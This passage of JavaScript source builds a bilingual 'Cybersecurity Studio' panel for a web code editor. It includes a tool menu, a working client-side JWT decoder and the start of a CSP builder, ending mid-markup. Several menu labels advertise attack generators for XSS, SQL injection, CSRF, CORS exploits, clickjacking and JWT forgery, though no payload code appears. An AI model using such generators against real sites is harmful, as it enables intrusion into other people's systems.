(function() {
  'use strict';

  // ═══════════════════════════════════════════
  // 🛡️ CYBERSECURITY & ETHICAL HACKING STUDIO (16 PROFESSIONAL TOOLS)
  // ═══════════════════════════════════════════

  const TX = {
    en: {
      title: 'CYBERSECURITY STUDIO',
      sub: 'Professional Infosec Toolkit & Simulators',
      back: '← Back',
      inject: '➕ Inject Tool Code',
      injected: '✅ Tool Code Injected!',
      tools: {
        jwt: { name: 'JWT Inspector & Forge', desc: 'Decode, analyze, and forge JSON Web Tokens for API security testing.', injectBtn: 'Inject JWT Inspector' },
        csp: { name: 'Strict CSP Builder', desc: 'Construct impregnable Content Security Policies to prevent XSS attacks.', injectBtn: 'Inject CSP Builder' },
        xss: { name: 'XSS Payload Generator', desc: 'Test forms against real-world Cross-Site Scripting vectors.', injectBtn: 'Inject XSS Tester' },
        encode: { name: 'Encoder / Decoder Toolkit', desc: 'Swiss-army knife for Base64, Hex, URL, and Binary conversions.', injectBtn: 'Inject Encoder Toolkit' },
        cidr: { name: 'Subnet & CIDR Calculator', desc: 'Calculate IP ranges, masks, and network boundaries for firewall rules.', injectBtn: 'Inject CIDR Calculator' },
        crypto: { name: 'Visual Crypto Lab', desc: 'Live hash generation & encryption visualizer.', encryptText: 'Text to Encrypt:', algorithm: 'Algorithm:', injectBtn: 'Inject Encryption Engine' },
        net: { name: 'Penetration Network Sim', desc: 'Radar-based network attack visualizer.', targetIP: 'Target Node IP:', attackType: 'Vector:', startBtn: '📡 Launch Scan', injectBtn: 'Inject Network Simulator' },
        crack: { name: 'Password Crack Matrix', desc: 'Brute-force algorithm visualizer.', password: 'Test Password:', strength: 'Strength:', injectBtn: 'Inject Brute-Force Matrix' },
        bcrypt: { name: 'Bcrypt Generator/Verifier', desc: 'Generate and verify Bcrypt password hashes with custom cost factors.', injectBtn: 'Inject Bcrypt Tool' },
        headers: { name: 'HTTP Headers Analyzer', desc: 'Check server HTTP headers for missing security configurations (HSTS, CSP).', injectBtn: 'Inject Header Analyzer' },
        sqli: { name: 'SQLi Payload Forge', desc: 'Construct advanced SQL Injection vectors for database vulnerability testing.', injectBtn: 'Inject SQLi Forge' },
        cors: { name: 'CORS Exploit Tester', desc: 'Generate POCs to test Cross-Origin Resource Sharing misconfigurations.', injectBtn: 'Inject CORS Tester' },
        csrf: { name: 'CSRF Payload Builder', desc: 'Generate auto-submitting hidden forms to demonstrate Cross-Site Request Forgery.', injectBtn: 'Inject CSRF Builder' },
        stego: { name: 'Image Steganography Engine', desc: 'Hide and extract secret text directly within the pixels of an image.', injectBtn: 'Inject Stego Engine' },
        clickjack: { name: 'Clickjacking POC Creator', desc: 'Demonstrate UI Redressing with transparent iframe overlays.', injectBtn: 'Inject Clickjack POC' },
        entropy: { name: 'Advanced Password Entropy', desc: 'Calculate cryptographic strength and brute-force time mathematically.', injectBtn: 'Inject Entropy Calc' }
      }
    },
    fr: {
      title: 'STUDIO CYBERSÉCURITÉ',
      sub: 'Boîte à outils Infosec Pro & Simulateurs',
      back: '← Retour',
      inject: '➕ Injecter le Code',
      injected: '✅ Code de l\'outil injecté!',
      tools: {
        jwt: { name: 'Inspecteur & Forge JWT', desc: 'Décodez, analysez et falsifiez des jetons JWT pour tester les API.', injectBtn: 'Injecter l\'Inspecteur JWT' },
        csp: { name: 'Générateur CSP Strict', desc: 'Construisez des politiques de sécurité impénétrables (XSS).', injectBtn: 'Injecter le Générateur CSP' },
        xss: { name: 'Générateur de Payload XSS', desc: 'Testez les formulaires contre des vecteurs XSS du monde réel.', injectBtn: 'Injecter le Testeur XSS' },
        encode: { name: 'Boîte à outils Encodage', desc: 'Couteau suisse pour les conversions Base64, Hex, URL et Binaire.', injectBtn: 'Injecter la Boîte à Outils' },
        cidr: { name: 'Calculateur Sous-réseau CIDR', desc: 'Calculez les plages IP, masques et limites pour pare-feu.', injectBtn: 'Injecter le Calculateur CIDR' },
        crypto: { name: 'Laboratoire Crypto Visuel', desc: 'Générateur de hash en direct & visualiseur de chiffrement.', encryptText: 'Texte à Chiffrer:', algorithm: 'Algorithme:', injectBtn: 'Injecter le Moteur de Chiffrement' },
        net: { name: 'Simulateur de Pénétration', desc: 'Visualiseur d\'attaque réseau basé sur radar.', targetIP: 'IP du Nœud Cible:', attackType: 'Vecteur:', startBtn: '📡 Lancer le Scan', injectBtn: 'Injecter le Simulateur Réseau' },
        crack: { name: 'Matrice de Craquage', desc: 'Visualiseur d\'algorithme de force brute.', password: 'Mot de Passe Test:', strength: 'Force:', injectBtn: 'Injecter la Matrice Force Brute' },
        bcrypt: { name: 'Générateur/Vérificateur Bcrypt', desc: 'Générez et vérifiez les hachages Bcrypt avec des facteurs de coût.', injectBtn: 'Injecter Outil Bcrypt' },
        headers: { name: 'Analyseur En-têtes HTTP', desc: 'Vérifiez les configurations de sécurité manquantes (HSTS, CSP).', injectBtn: 'Injecter Analyseur' },
        sqli: { name: 'Forge de Payload SQLi', desc: 'Construisez des vecteurs d\'Injection SQL avancés pour les tests.', injectBtn: 'Injecter Forge SQLi' },
        cors: { name: 'Testeur Exploit CORS', desc: 'Générez des preuves de concept pour tester les erreurs de configuration CORS.', injectBtn: 'Injecter Testeur CORS' },
        csrf: { name: 'Générateur Payload CSRF', desc: 'Générez des formulaires cachés auto-soumis pour démontrer les falsifications de requêtes.', injectBtn: 'Injecter Générateur CSRF' },
        stego: { name: 'Moteur de Stéganographie', desc: 'Cachez et extrayez du texte secret directement dans les pixels d\'une image.', injectBtn: 'Injecter Moteur Stégano' },
        clickjack: { name: 'Créateur POC Clickjacking', desc: 'Démontrez le détournement d\'interface avec des overlays iframe transparents.', injectBtn: 'Injecter POC Clickjack' },
        entropy: { name: 'Entropie de Mot de Passe', desc: 'Calculez mathématiquement la force cryptographique et le temps de force brute.', injectBtn: 'Injecter Calculateur' }
      }
    }
  };

  function gl() { return window.appLang || 'en'; }

  function getTranslation(tool, key) {
    const lang = gl();
    return TX[lang] && TX[lang].tools[tool] && TX[lang].tools[tool][key]
      ? TX[lang].tools[tool][key]
      : (TX['en'].tools[tool] ? TX['en'].tools[tool][key] : key);
  }

  function showBannerToast(msg) {
    if (window.showToast) window.showToast(msg);
    else console.log('[CYBER STUDIO Toast]:', msg);
  }

  window._injectCyberStudioCode = function(code) {
    if (window.editor) {
      window.editor.setValue(code);
      if (window.runPreview) window.runPreview();
      const lang = gl();
      showBannerToast(TX[lang].injected);
    }
  };

  const originalRenderTab = window.renderTab;
  window.renderTab = function(tab) {
    if (tab === 'cyberstudio') {
      window.activeTab = 'cyberstudio';
      document.querySelectorAll('.ltab').forEach(b => b.classList.remove('active'));
      const btn = document.getElementById('tab-cyberstudio');
      if (btn) btn.classList.add('active');
      window.initCyberStudio(gl());
      return;
    }
    if (typeof originalRenderTab === 'function') originalRenderTab(tab);
  };

  window.initCyberStudio = function(lang) {
    const el = document.getElementById('left-body');
    if (!el) return;
    const activeTx = TX[lang] || TX['en'];

    el.innerHTML = `
      <div style="padding:15px; font-family:'Inter', sans-serif; overflow-y:auto; height:100%; box-sizing:border-box; background:#020617; color:#f8fafc;">
        <div style="background:linear-gradient(135deg, rgba(16,185,129,0.1), rgba(20,184,166,0.1)); border-radius:14px; padding:16px; border:1px solid rgba(16,185,129,0.3); margin-bottom:20px; display:flex; align-items:center; gap:12px; box-shadow:0 8px 32px rgba(0,0,0,0.5);">
          <span style="font-size:32px; filter:drop-shadow(0 0 10px #10b981);">🛡️</span>
          <div>
            <h2 style="margin:0; color:#10b981; font-size:16px; font-weight:900; letter-spacing:0.5px; text-shadow:0 0 10px rgba(16,185,129,0.4);">${activeTx.title}</h2>
            <p style="margin:4px 0 0; color:#94a3b8; font-size:11px; font-weight:500;">${activeTx.sub}</p>
          </div>
        </div>

        <div style="display:grid; grid-template-columns:1fr; gap:10px;">
          <!-- 1. JWT -->
          <div onclick="window.handleCyberTool('jwt')" style="background:rgba(15, 23, 42, 0.8); border:1px solid rgba(245, 158, 11, 0.3); border-radius:12px; padding:14px; cursor:pointer; transition:all 0.25s; display:flex; align-items:center; gap:12px;" onmouseover="this.style.borderColor='#f59e0b'; this.style.boxShadow='0 0 15px rgba(245, 158, 11, 0.2)';" onmouseout="this.style.borderColor='rgba(245, 158, 11, 0.3)'; this.style.boxShadow='none';">
            <div style="font-size:24px; width:44px; height:44px; display:flex; align-items:center; justify-content:center; background:rgba(245, 158, 11, 0.1); border-radius:10px; color:#f59e0b;">🎫</div>
            <div style="flex:1;"><div style="color:#f59e0b; font-weight:800; font-size:13px;">${getTranslation('jwt', 'name')}</div><div style="color:#64748b; font-size:10px; margin-top:3px;">${getTranslation('jwt', 'desc')}</div></div>
          </div>
          <!-- 2. CSP Builder -->
          <div onclick="window.handleCyberTool('csp')" style="background:rgba(15, 23, 42, 0.8); border:1px solid rgba(16, 185, 129, 0.3); border-radius:12px; padding:14px; cursor:pointer; transition:all 0.25s; display:flex; align-items:center; gap:12px;" onmouseover="this.style.borderColor='#10b981'; this.style.boxShadow='0 0 15px rgba(16, 185, 129, 0.2)';" onmouseout="this.style.borderColor='rgba(16, 185, 129, 0.3)'; this.style.boxShadow='none';">
            <div style="font-size:24px; width:44px; height:44px; display:flex; align-items:center; justify-content:center; background:rgba(16, 185, 129, 0.1); border-radius:10px; color:#10b981;">🛡️</div>
            <div style="flex:1;"><div style="color:#10b981; font-weight:800; font-size:13px;">${getTranslation('csp', 'name')}</div><div style="color:#64748b; font-size:10px; margin-top:3px;">${getTranslation('csp', 'desc')}</div></div>
          </div>
          <!-- 3. XSS Tester -->
          <div onclick="window.handleCyberTool('xss')" style="background:rgba(15, 23, 42, 0.8); border:1px solid rgba(239, 68, 68, 0.3); border-radius:12px; padding:14px; cursor:pointer; transition:all 0.25s; display:flex; align-items:center; gap:12px;" onmouseover="this.style.borderColor='#ef4444'; this.style.boxShadow='0 0 15px rgba(239, 68, 68, 0.2)';" onmouseout="this.style.borderColor='rgba(239, 68, 68, 0.3)'; this.style.boxShadow='none';">
            <div style="font-size:24px; width:44px; height:44px; display:flex; align-items:center; justify-content:center; background:rgba(239, 68, 68, 0.1); border-radius:10px; color:#ef4444;">🐛</div>
            <div style="flex:1;"><div style="color:#ef4444; font-weight:800; font-size:13px;">${getTranslation('xss', 'name')}</div><div style="color:#64748b; font-size:10px; margin-top:3px;">${getTranslation('xss', 'desc')}</div></div>
          </div>
          <!-- 4. Encoder Toolkit -->
          <div onclick="window.handleCyberTool('encode')" style="background:rgba(15, 23, 42, 0.8); border:1px solid rgba(168, 85, 247, 0.3); border-radius:12px; padding:14px; cursor:pointer; transition:all 0.25s; display:flex; align-items:center; gap:12px;" onmouseover="this.style.borderColor='#a855f7'; this.style.boxShadow='0 0 15px rgba(168, 85, 247, 0.2)';" onmouseout="this.style.borderColor='rgba(168, 85, 247, 0.3)'; this.style.boxShadow='none';">
            <div style="font-size:24px; width:44px; height:44px; display:flex; align-items:center; justify-content:center; background:rgba(168, 85, 247, 0.1); border-radius:10px; color:#a855f7;">🧮</div>
            <div style="flex:1;"><div style="color:#a855f7; font-weight:800; font-size:13px;">${getTranslation('encode', 'name')}</div><div style="color:#64748b; font-size:10px; margin-top:3px;">${getTranslation('encode', 'desc')}</div></div>
          </div>
          <!-- 5. CIDR Calculator -->
          <div onclick="window.handleCyberTool('cidr')" style="background:rgba(15, 23, 42, 0.8); border:1px solid rgba(14, 165, 233, 0.3); border-radius:12px; padding:14px; cursor:pointer; transition:all 0.25s; display:flex; align-items:center; gap:12px;" onmouseover="this.style.borderColor='#0ea5e9'; this.style.boxShadow='0 0 15px rgba(14, 165, 233, 0.2)';" onmouseout="this.style.borderColor='rgba(14, 165, 233, 0.3)'; this.style.boxShadow='none';">
            <div style="font-size:24px; width:44px; height:44px; display:flex; align-items:center; justify-content:center; background:rgba(14, 165, 233, 0.1); border-radius:10px; color:#0ea5e9;">🌐</div>
            <div style="flex:1;"><div style="color:#0ea5e9; font-weight:800; font-size:13px;">${getTranslation('cidr', 'name')}</div><div style="color:#64748b; font-size:10px; margin-top:3px;">${getTranslation('cidr', 'desc')}</div></div>
          </div>
          <!-- 6. Bcrypt -->
          <div onclick="window.handleCyberTool('bcrypt')" style="background:rgba(15, 23, 42, 0.8); border:1px solid rgba(236, 72, 153, 0.3); border-radius:12px; padding:14px; cursor:pointer; transition:all 0.25s; display:flex; align-items:center; gap:12px;" onmouseover="this.style.borderColor='#ec4899'; this.style.boxShadow='0 0 15px rgba(236, 72, 153, 0.2)';" onmouseout="this.style.borderColor='rgba(236, 72, 153, 0.3)'; this.style.boxShadow='none';">
            <div style="font-size:24px; width:44px; height:44px; display:flex; align-items:center; justify-content:center; background:rgba(236, 72, 153, 0.1); border-radius:10px; color:#ec4899;">🔒</div>
            <div style="flex:1;"><div style="color:#ec4899; font-weight:800; font-size:13px;">${getTranslation('bcrypt', 'name')}</div><div style="color:#64748b; font-size:10px; margin-top:3px;">${getTranslation('bcrypt', 'desc')}</div></div>
          </div>
          <!-- 7. Headers Analyzer -->
          <div onclick="window.handleCyberTool('headers')" style="background:rgba(15, 23, 42, 0.8); border:1px solid rgba(249, 115, 22, 0.3); border-radius:12px; padding:14px; cursor:pointer; transition:all 0.25s; display:flex; align-items:center; gap:12px;" onmouseover="this.style.borderColor='#f97316'; this.style.boxShadow='0 0 15px rgba(249, 115, 22, 0.2)';" onmouseout="this.style.borderColor='rgba(249, 115, 22, 0.3)'; this.style.boxShadow='none';">
            <div style="font-size:24px; width:44px; height:44px; display:flex; align-items:center; justify-content:center; background:rgba(249, 115, 22, 0.1); border-radius:10px; color:#f97316;">📋</div>
            <div style="flex:1;"><div style="color:#f97316; font-weight:800; font-size:13px;">${getTranslation('headers', 'name')}</div><div style="color:#64748b; font-size:10px; margin-top:3px;">${getTranslation('headers', 'desc')}</div></div>
          </div>
          <!-- 8. SQLi Forge -->
          <div onclick="window.handleCyberTool('sqli')" style="background:rgba(15, 23, 42, 0.8); border:1px solid rgba(234, 179, 8, 0.3); border-radius:12px; padding:14px; cursor:pointer; transition:all 0.25s; display:flex; align-items:center; gap:12px;" onmouseover="this.style.borderColor='#eab308'; this.style.boxShadow='0 0 15px rgba(234, 179, 8, 0.2)';" onmouseout="this.style.borderColor='rgba(234, 179, 8, 0.3)'; this.style.boxShadow='none';">
            <div style="font-size:24px; width:44px; height:44px; display:flex; align-items:center; justify-content:center; background:rgba(234, 179, 8, 0.1); border-radius:10px; color:#eab308;">🕵️</div>
            <div style="flex:1;"><div style="color:#eab308; font-weight:800; font-size:13px;">${getTranslation('sqli', 'name')}</div><div style="color:#64748b; font-size:10px; margin-top:3px;">${getTranslation('sqli', 'desc')}</div></div>
          </div>
          <!-- 9. CORS Exploit Tester -->
          <div onclick="window.handleCyberTool('cors')" style="background:rgba(15, 23, 42, 0.8); border:1px solid rgba(99, 102, 241, 0.3); border-radius:12px; padding:14px; cursor:pointer; transition:all 0.25s; display:flex; align-items:center; gap:12px;" onmouseover="this.style.borderColor='#6366f1'; this.style.boxShadow='0 0 15px rgba(99, 102, 241, 0.2)';" onmouseout="this.style.borderColor='rgba(99, 102, 241, 0.3)'; this.style.boxShadow='none';">
            <div style="font-size:24px; width:44px; height:44px; display:flex; align-items:center; justify-content:center; background:rgba(99, 102, 241, 0.1); border-radius:10px; color:#6366f1;">🕸️</div>
            <div style="flex:1;"><div style="color:#6366f1; font-weight:800; font-size:13px;">${getTranslation('cors', 'name')}</div><div style="color:#64748b; font-size:10px; margin-top:3px;">${getTranslation('cors', 'desc')}</div></div>
          </div>
          
          <!-- 10. CSRF Payload Builder -->
          <div onclick="window.handleCyberTool('csrf')" style="background:rgba(15, 23, 42, 0.8); border:1px solid rgba(244, 63, 94, 0.3); border-radius:12px; padding:14px; cursor:pointer; transition:all 0.25s; display:flex; align-items:center; gap:12px;" onmouseover="this.style.borderColor='#f43f5e'; this.style.boxShadow='0 0 15px rgba(244, 63, 94, 0.2)';" onmouseout="this.style.borderColor='rgba(244, 63, 94, 0.3)'; this.style.boxShadow='none';">
            <div style="font-size:24px; width:44px; height:44px; display:flex; align-items:center; justify-content:center; background:rgba(244, 63, 94, 0.1); border-radius:10px; color:#f43f5e;">🎭</div>
            <div style="flex:1;"><div style="color:#f43f5e; font-weight:800; font-size:13px;">${getTranslation('csrf', 'name')}</div><div style="color:#64748b; font-size:10px; margin-top:3px;">${getTranslation('csrf', 'desc')}</div></div>
          </div>
          
          <!-- 11. Image Steganography -->
          <div onclick="window.handleCyberTool('stego')" style="background:rgba(15, 23, 42, 0.8); border:1px solid rgba(20, 184, 166, 0.3); border-radius:12px; padding:14px; cursor:pointer; transition:all 0.25s; display:flex; align-items:center; gap:12px;" onmouseover="this.style.borderColor='#14b8a6'; this.style.boxShadow='0 0 15px rgba(20, 184, 166, 0.2)';" onmouseout="this.style.borderColor='rgba(20, 184, 166, 0.3)'; this.style.boxShadow='none';">
            <div style="font-size:24px; width:44px; height:44px; display:flex; align-items:center; justify-content:center; background:rgba(20, 184, 166, 0.1); border-radius:10px; color:#14b8a6;">🖼️</div>
            <div style="flex:1;"><div style="color:#14b8a6; font-weight:800; font-size:13px;">${getTranslation('stego', 'name')}</div><div style="color:#64748b; font-size:10px; margin-top:3px;">${getTranslation('stego', 'desc')}</div></div>
          </div>
          
          <!-- 12. Clickjacking POC -->
          <div onclick="window.handleCyberTool('clickjack')" style="background:rgba(15, 23, 42, 0.8); border:1px solid rgba(139, 92, 246, 0.3); border-radius:12px; padding:14px; cursor:pointer; transition:all 0.25s; display:flex; align-items:center; gap:12px;" onmouseover="this.style.borderColor='#8b5cf6'; this.style.boxShadow='0 0 15px rgba(139, 92, 246, 0.2)';" onmouseout="this.style.borderColor='rgba(139, 92, 246, 0.3)'; this.style.boxShadow='none';">
            <div style="font-size:24px; width:44px; height:44px; display:flex; align-items:center; justify-content:center; background:rgba(139, 92, 246, 0.1); border-radius:10px; color:#8b5cf6;">🪟</div>
            <div style="flex:1;"><div style="color:#8b5cf6; font-weight:800; font-size:13px;">${getTranslation('clickjack', 'name')}</div><div style="color:#64748b; font-size:10px; margin-top:3px;">${getTranslation('clickjack', 'desc')}</div></div>
          </div>

          <!-- 13. Advanced Password Entropy -->
          <div onclick="window.handleCyberTool('entropy')" style="background:rgba(15, 23, 42, 0.8); border:1px solid rgba(6, 182, 212, 0.3); border-radius:12px; padding:14px; cursor:pointer; transition:all 0.25s; display:flex; align-items:center; gap:12px;" onmouseover="this.style.borderColor='#06b6d4'; this.style.boxShadow='0 0 15px rgba(6, 182, 212, 0.2)';" onmouseout="this.style.borderColor='rgba(6, 182, 212, 0.3)'; this.style.boxShadow='none';">
            <div style="font-size:24px; width:44px; height:44px; display:flex; align-items:center; justify-content:center; background:rgba(6, 182, 212, 0.1); border-radius:10px; color:#06b6d4;">🔐</div>
            <div style="flex:1;"><div style="color:#06b6d4; font-weight:800; font-size:13px;">${getTranslation('entropy', 'name')}</div><div style="color:#64748b; font-size:10px; margin-top:3px;">${getTranslation('entropy', 'desc')}</div></div>
          </div>

          <!-- 14. Crypto Lab -->
          <div onclick="window.handleCyberTool('crypto')" style="background:rgba(15, 23, 42, 0.8); border:1px solid rgba(16, 185, 129, 0.3); border-radius:12px; padding:14px; cursor:pointer; transition:all 0.25s; display:flex; align-items:center; gap:12px;" onmouseover="this.style.borderColor='#10b981'; this.style.boxShadow='0 0 15px rgba(16, 185, 129, 0.2)';" onmouseout="this.style.borderColor='rgba(16, 185, 129, 0.3)'; this.style.boxShadow='none';">
            <div style="font-size:24px; width:44px; height:44px; display:flex; align-items:center; justify-content:center; background:rgba(16, 185, 129, 0.1); border-radius:10px; color:#10b981;">🔐</div>
            <div style="flex:1;"><div style="color:#10b981; font-weight:800; font-size:13px;">${getTranslation('crypto', 'name')}</div><div style="color:#64748b; font-size:10px; margin-top:3px;">${getTranslation('crypto', 'desc')}</div></div>
          </div>
          <!-- 15. Network Sim -->
          <div onclick="window.handleCyberTool('net')" style="background:rgba(15, 23, 42, 0.8); border:1px solid rgba(14, 165, 233, 0.3); border-radius:12px; padding:14px; cursor:pointer; transition:all 0.25s; display:flex; align-items:center; gap:12px;" onmouseover="this.style.borderColor='#0ea5e9'; this.style.boxShadow='0 0 15px rgba(14, 165, 233, 0.2)';" onmouseout="this.style.borderColor='rgba(14, 165, 233, 0.3)'; this.style.boxShadow='none';">
            <div style="font-size:24px; width:44px; height:44px; display:flex; align-items:center; justify-content:center; background:rgba(14, 165, 233, 0.1); border-radius:10px; color:#0ea5e9;">🛰️</div>
            <div style="flex:1;"><div style="color:#0ea5e9; font-weight:800; font-size:13px;">${getTranslation('net', 'name')}</div><div style="color:#64748b; font-size:10px; margin-top:3px;">${getTranslation('net', 'desc')}</div></div>
          </div>
          <!-- 16. Password Matrix -->
          <div onclick="window.handleCyberTool('crack')" style="background:rgba(15, 23, 42, 0.8); border:1px solid rgba(239, 68, 68, 0.3); border-radius:12px; padding:14px; cursor:pointer; transition:all 0.25s; display:flex; align-items:center; gap:12px;" onmouseover="this.style.borderColor='#ef4444'; this.style.boxShadow='0 0 15px rgba(239, 68, 68, 0.2)';" onmouseout="this.style.borderColor='rgba(239, 68, 68, 0.3)'; this.style.boxShadow='none';">
            <div style="font-size:24px; width:44px; height:44px; display:flex; align-items:center; justify-content:center; background:rgba(239, 68, 68, 0.1); border-radius:10px; color:#ef4444;">🔑</div>
            <div style="flex:1;"><div style="color:#ef4444; font-weight:800; font-size:13px;">${getTranslation('crack', 'name')}</div><div style="color:#64748b; font-size:10px; margin-top:3px;">${getTranslation('crack', 'desc')}</div></div>
          </div>
        </div>
      </div>
    `;
  };

  window.handleCyberTool = function(toolId) {
    const el = document.getElementById('left-body');
    if (!el) return;
    const lang = gl();
    const activeTx = TX[lang] || TX['en'];

    const backBtn = `
      <button onclick="window.initCyberStudio('${lang}')" style="background:rgba(255,255,255,0.05); color:#94a3b8; border:1px solid rgba(255,255,255,0.1); padding:8px 14px; border-radius:8px; cursor:pointer; margin-bottom:15px; font-size:11px; font-weight:700; transition:all 0.2s; display:flex; align-items:center; gap:6px;" onmouseover="this.style.background='rgba(255,255,255,0.1)'; this.style.color='#fff';">
        ${activeTx.back}
      </button>
    `;

    if (toolId === 'jwt') renderToolIntro(el, backBtn, toolId, lang, '#f59e0b', '🎫', getJWTCode(lang));
    else if (toolId === 'csp') renderToolIntro(el, backBtn, toolId, lang, '#10b981', '🛡️', getCSPCode(lang));
    else if (toolId === 'xss') renderToolIntro(el, backBtn, toolId, lang, '#ef4444', '🐛', getXSSCode(lang));
    else if (toolId === 'encode') renderToolIntro(el, backBtn, toolId, lang, '#a855f7', '🧮', getEncodeCode(lang));
    else if (toolId === 'cidr') renderToolIntro(el, backBtn, toolId, lang, '#0ea5e9', '🌐', getCIDRCode(lang));
    else if (toolId === 'bcrypt') renderToolIntro(el, backBtn, toolId, lang, '#ec4899', '🔒', getBcryptCode(lang));
    else if (toolId === 'headers') renderToolIntro(el, backBtn, toolId, lang, '#f97316', '📋', getHeadersCode(lang));
    else if (toolId === 'sqli') renderToolIntro(el, backBtn, toolId, lang, '#eab308', '🕵️', getSqliCode(lang));
    else if (toolId === 'cors') renderToolIntro(el, backBtn, toolId, lang, '#6366f1', '🕸️', getCorsCode(lang));
    else if (toolId === 'csrf') renderToolIntro(el, backBtn, toolId, lang, '#f43f5e', '🎭', getCSRFCode(lang));
    else if (toolId === 'stego') renderToolIntro(el, backBtn, toolId, lang, '#14b8a6', '🖼️', getStegoCode(lang));
    else if (toolId === 'clickjack') renderToolIntro(el, backBtn, toolId, lang, '#8b5cf6', '🪟', getClickjackCode(lang));
    else if (toolId === 'entropy') renderToolIntro(el, backBtn, toolId, lang, '#06b6d4', '🔐', getEntropyCode(lang));
    else if (toolId === 'crypto') renderCrypto(el, backBtn, lang);
    else if (toolId === 'net') renderNetSim(el, backBtn, lang);
    else if (toolId === 'crack') renderCrack(el, backBtn, lang);
  };

  function renderToolIntro(parent, backBtn, toolId, lang, color, icon, code) {
    const tx = TX[lang].tools[toolId];
    parent.innerHTML = `
      <div style="padding:15px; font-family:'Inter', sans-serif; height:100%; overflow-y:auto; box-sizing:border-box; background:#020617;">
        ${backBtn}
        <h3 style="color:${color}; margin:0 0 5px; font-size:15px; font-weight:800;">${icon} ${tx.name}</h3>
        <p style="color:#64748b; font-size:11px; margin:0 0 20px;">${tx.desc}</p>
        
        <div style="background:#0f172a; border:1px dashed ${color}; border-radius:10px; padding:20px; text-align:center; margin-bottom:20px;">
          <div style="font-size:40px; margin-bottom:10px; opacity:0.8;">${icon}</div>
          <div style="color:#94a3b8; font-size:12px; margin-bottom:10px;">Ready to generate the standalone tool.</div>
        </div>

        <button id="btnInject${toolId}" style="width:100%; padding:12px; border-radius:8px; background:${color}; border:none; color:#000; font-weight:900; font-size:13px; cursor:pointer; box-shadow:0 4px 15px ${color}44;">
          ${tx.injectBtn}
        </button>
      </div>
    `;

    document.getElementById(`btnInject${toolId}`).addEventListener('click', () => {
      window._injectCyberStudioCode(code);
    });
  }

  // ═══════════════════════════════════════════
  // TOOL 1: JWT Inspector
  // ═══════════════════════════════════════════
  function getJWTCode(lang) {
    return `<!DOCTYPE html>
<html lang="${lang}">
<head>
<meta charset="UTF-8">
<title>JWT Inspector & Forge</title>
<style>
  body { background: #020617; color: #cbd5e1; font-family: 'Inter', monospace; margin: 0; padding: 20px; }
  h1 { color: #f59e0b; margin-top: 0; }
  .container { display: flex; gap: 20px; max-width: 1200px; margin: 0 auto; flex-wrap: wrap; }
  .col { flex: 1; display: flex; flex-direction: column; gap: 15px; min-width: 300px; }
  textarea { width: 100%; height: 200px; background: #0f172a; border: 1px solid #334155; color: #f59e0b; padding: 15px; border-radius: 8px; box-sizing: border-box; font-family: monospace; resize: vertical; }
  .part { background: #0f172a; border: 1px solid #1e293b; border-radius: 8px; overflow: hidden; }
  .part-header { padding: 10px 15px; font-weight: bold; background: rgba(0,0,0,0.2); }
  .header-red { color: #ef4444; border-bottom: 1px solid rgba(239, 68, 68, 0.2); }
  .header-purple { color: #a855f7; border-bottom: 1px solid rgba(168, 85, 247, 0.2); }
  .header-blue { color: #0ea5e9; border-bottom: 1px solid rgba(14, 165, 233, 0.2); }
  .part-body pre { margin: 0; padding: 15px; overflow-x: auto; font-size: 13px; color: #e2e8f0; }
</style>
</head>
<body>
  <div class="container">
    <div class="col">
      <h1>🎫 JWT Inspector</h1>
      <p>Paste a JSON Web Token to decode it instantly.</p>
      <textarea id="jwtInput" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."></textarea>
      <div id="errorMsg" style="color: #ef4444; font-weight: bold;"></div>
    </div>
    <div class="col">
      <div class="part">
        <div class="part-header header-red">HEADER (Algorithm & Type)</div>
        <div class="part-body"><pre id="jwtHeader">{}</pre></div>
      </div>
      <div class="part">
        <div class="part-header header-purple">PAYLOAD (Data)</div>
        <div class="part-body"><pre id="jwtPayload">{}</pre></div>
      </div>
      <div class="part">
        <div class="part-header header-blue">SIGNATURE</div>
        <div class="part-body"><pre id="jwtSignature" style="word-break: break-all;">-</pre></div>
      </div>
    </div>
  </div>
<script>
function base64UrlDecode(str) {
  let output = str.replace(/-/g, '+').replace(/_/g, '/');
  switch (output.length % 4) {
    case 0: break; case 2: output += '=='; break; case 3: output += '='; break;
    default: throw 'Illegal base64url string!';
  }
  return decodeURIComponent(escape(window.atob(output)));
}
document.getElementById('jwtInput').addEventListener('input', function(e) {
  const token = e.target.value.trim();
  const parts = token.split('.');
  const errorEl = document.getElementById('errorMsg');
  if (!token) {
    document.getElementById('jwtHeader').textContent = '{}';
    document.getElementById('jwtPayload').textContent = '{}';
    document.getElementById('jwtSignature').textContent = '-';
    errorEl.textContent = ''; return;
  }
  if (parts.length !== 3) { errorEl.textContent = 'Invalid JWT format.'; return; }
  try {
    const header = JSON.parse(base64UrlDecode(parts[0]));
    const payload = JSON.parse(base64UrlDecode(parts[1]));
    document.getElementById('jwtHeader').textContent = JSON.stringify(header, null, 2);
    document.getElementById('jwtPayload').textContent = JSON.stringify(payload, null, 2);
    document.getElementById('jwtSignature').textContent = parts[2];
    errorEl.textContent = '';
  } catch (err) { errorEl.textContent = 'Error: ' + err.message; }
});
</script>
</body>
</html>`;
  }

  // ═══════════════════════════════════════════
  // TOOL 2: CSP Builder
  // ═══════════════════════════════════════════
  function getCSPCode(lang) {
    return `<!DOCTYPE html>
<html lang="${lang}">
<head>
<meta charset="UTF-8">
<title>Strict CSP Builder</title>
<style>
  body { background: #020617; color: #cbd5e1; font-family: 'Inter', sans-serif; margin: 0; padding: 30px; }
  h1 { color: #10b981; margin-top: 0; }
  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
  .card { background: #0f172a; border: 1px solid #1e293b; padding: 20px; border-radius: 8px; }
  h3 { color: #34d399; margin-top: 0; }
  .row { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
  input[type="text"] { flex: 1; background: #020617; border: 1px solid #334155; color: #fff; padding: 8px; border-radius: 4px; }
  .output-box { margin-top: 30px; background: #000; border: 1px solid #10b981; padding: 20px; border-radius: 8px; font-family: monospace; color: #10b981; word-break: break-all; }
</style>
</head>
<body>
  <h1>🛡️ Content Security Policy Builder</h1>
  <p>Configure directives to generate a robust CSP header.</p>
  <div class="grid" id="builder">
    <div class="card">
      <h3>default-src</h3>
      <div class="row"><input type="checkbox" id="def-self" checked> <label>'self'</label></div>
      <div class="row"><input type="checkbox" id="def-none"> <label>'none'</label></div>
      <div class="row"><input type="text" id="def-custom" placeholder="e.g. https://api.example.com"></div>
    </div>
    <div class="card">
      <h3>script-src</h3>
      <div class="row"><input type="checkbox" id="scr-self" checked> <label>'self'</label></div>
